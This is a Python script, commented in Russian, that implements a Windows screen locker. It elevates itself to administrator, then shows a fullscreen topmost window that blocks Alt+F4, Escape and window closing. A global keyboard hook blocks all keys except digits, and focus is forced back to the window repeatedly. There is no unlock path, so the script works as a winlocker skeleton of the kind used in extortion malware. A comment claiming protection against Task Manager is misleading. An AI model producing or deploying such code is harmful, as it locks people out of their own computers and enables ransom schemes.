import tkinter as tk
import keyboard
import ctypes
import sys

# Блокировка Alt+F4 через глобальный хук
def block_alt_f4():
    keyboard.add_hotkey('alt+f4', lambda: None)

# Блокировка всех клавиш, кроме цифр (включая backspace и enter для удобства)
def block_non_digits():
    allowed_keys = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'backspace', 'enter']
    def on_key(event):
        if event.name not in allowed_keys:
            return False  # блокируем клавишу
    keyboard.hook(on_key)

# Полноэкранное окно поверх всех окон
def create_locker():
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.attributes('-toolwindow', True)  # убирает кнопки свернуть/закрыть (не влияет на Alt+F4)
    root.bind('<Alt-F4>', lambda e: 'break')  # дополнительная защита в tkinter
    root.bind('<Escape>', lambda e: 'break')  # блокировка Esc
    
    # Поле ввода только для цифр (встроенная защита)
    entry_var = tk.StringVar()
    entry = tk.Entry(root, textvariable=entry_var, font=('Arial', 24), justify='center')
    entry.pack(expand=True, fill='both', padx=20, pady=20)
    entry.focus_set()
    
    # Метка с инструкцией
    label = tk.Label(root, text="Введите только цифры (другие клавиши заблокированы)\nAlt+F4 отключен", font=('Arial', 14))
    label.pack()
    
    # Принудительное удержание фокуса
    def keep_focus():
        entry.focus_force()
        root.after(100, keep_focus)
    keep_focus()
    
    # Защита от закрытия через диспетчер задач (только визуально, не дает закрыть процесс полностью)
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    
    root.mainloop()

if __name__ == "__main__":
    # Запрос прав администратора (Windows)
    if ctypes.windll.shell32.IsUserAnAdmin():
        block_alt_f4()
        block_non_digits()
        create_locker()
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)